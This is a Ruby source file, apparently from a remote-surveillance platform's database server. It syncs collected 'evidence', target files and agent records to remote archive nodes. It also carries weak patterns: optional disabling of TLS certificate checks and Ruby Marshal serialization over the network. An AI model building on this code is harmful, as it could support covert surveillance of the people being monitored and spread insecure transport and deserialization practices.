require 'thread'
require 'rest-client'
require 'rcs-common/trace'
require 'persistent_http'
require_relative 'db_objects/status'
require_relative 'db_objects/signature'

module RCS
  module DB
    class ArchiveNode
      include RCS::Tracer
      extend RCS::Tracer

      attr_reader :address

      def initialize(address)
        @address = address
      end

      def signature
        Signature.where(scope: 'network').first.try(:value)
      end

      def status
        ::Status.where(address: address, type: 'archive').first
      end

      def setup!
        body = {signatures: ::Signature.all}
        request("/sync/setup", body) do |code, content|
          if code == 200
            update_status(status: ::Status::OK, info: 'Online')
          else
            update_status(status: ::Status::ERROR, info: content[:msg])
          end
        end
      end

      def ping!
        request("/sync/status") do |code, content|
          if code == 200
            update_status(content[:status])
          else
            update_status(status: ::Status::ERROR, info: content[:msg])
            setup! if content[:result] == 'NEED_SIGNATURES'
          end
        end
      end

      # To prevent "redundant UTF-8 sequence" when calling body.to_json
      def fix_evidence_body_encoding(body)
        value = body[:evidence]['data']['body']

        if value.respond_to?(:force_encoding) and value.respond_to?(:valid_encoding?) and !value.valid_encoding?
          body[:evidence]['data']['body'] = value.force_encoding('BINARY')
        end
      rescue Exception => ex
        trace(:error, "Error in #fix_evidence_body_encoding: #{ex.message}")
      end

      def send_evidence(evidence, other_attributes)
        body = {evidence: evidence.attributes}.merge(other_attributes)

        fix_evidence_body_encoding(body)

        grid_id = evidence.data['_grid']

        if grid_id
          target_id = body[:path][1]
          grid = RCS::DB::GridFS.get(grid_id, target_id)
          body[:grid] = {content: grid.read, filename: grid.filename, content_type: grid.content_type, _id: grid_id}
        end

        request("/sync/evidence", body, on_error: :raise, marshal: true)
      end

      def send_items(operation_id)
        body = {items: ::Item.operation_items_sorted_by_kind(operation_id)}
        request("/sync/items", body, on_error: :raise)
      end

      def send_agent(operation_id, agent_id)
        body = {agent_id: agent_id}
        request("/sync/agent", body, on_error: :raise) do |code, content|
          send_items(operation_id) if content[:result] == 'MISSING'
        end
      end

      def send_sync_event(params)
        request("/sync/sync_event", params, on_error: :raise)
      end

      def uri
        @uri ||= begin
          valid_address = address
          valid_address = "https://#{valid_address}" unless valid_address.start_with?('https')
          URI.parse(valid_address)
        end
      end

      def self.connections
        @@persistent_http ||= {}
      end

      def reset_connection
        self.class.connections[address] = nil
      end

      def connection
        self.class.connections[address] ||= begin
          verify_mode = Config.instance.global['SSL_VERIFY'] ? OpenSSL::SSL::VERIFY_PEER : OpenSSL::SSL::VERIFY_NONE
          certificate_path = Config.instance.cert('rcs-db.crt')
          params = {
            name:         address,
            pool_size:    5,
            host:         uri.host,
            port:         uri.port,
            use_ssl:      true,
            ca_file:      certificate_path,
            cert:         OpenSSL::X509::Certificate.new(File.read(certificate_path)),
            verify_mode:  verify_mode,
            keep_alive:   50,
            open_timeout: 3,
            read_timeout: 3
          }

          PersistentHTTP.new(params)
        end
      end

      def request(path, body = {}, opts = {})
        trace :info, "Request #{path} on archive node #{address}"

        headers = {'x_sync_signature' => signature, 'Connection' => 'keep-alive'}

        rbody = if opts[:marshal] == true
                  headers['Content-Type'] = 'ruby/marshal'
                  Marshal.dump(body)
                else
                  headers['Content-Type'] = 'application/json'
                  body.to_json
                end

        request = Net::HTTP::Post.new(path, headers)
        request.body = rbody

        resp = connection.request(request)

        code = resp.code.to_i
        content = JSON.parse(resp.body).symbolize_keys rescue {}

        msg = "#{content[:result]} #{content[:msg]}".strip
        msg = resp.body if msg.empty?

        trace :info, "Archive node #{address} says #{code == 200 ? 'OK' : 'ERROR'} #{msg}"

        if code != 200 and opts[:on_error] == :raise
          raise(content[:msg] || "Received error #{code} from archive node #{address}")
        end

        yield(code, content) if block_given?
      rescue PersistentHTTP::Error => error
        trace :error, "Unable to reach archive node #{address}, #{error.message}"
        reset_connection
        raise(error.message) if opts[:on_error] == :raise
        yield(-1, {msg: error.message}) if block_given?
      end

      def update_status(attributes)
        current = status.try(:attributes) || {}
        attributes = current.symbolize_keys.merge(attributes.symbolize_keys)
        stats = attributes.reject { |key| ![:disk, :cpu, :pcpu].include?(key) }
        params = ["RCS::DB (Archive)", address, attributes[:status], attributes[:info], stats, 'archive', attributes[:version]]

        ::Status.status_update(*params)
      end

      def destroy
        status.try(:destroy)
      end

      def self.all
        addresses = ::Connector.enabled.where(type: 'REMOTE').only(:dest).distinct(:dest)
        addresses.map! { |addr| new(addr) }
      end
    end
  end
end
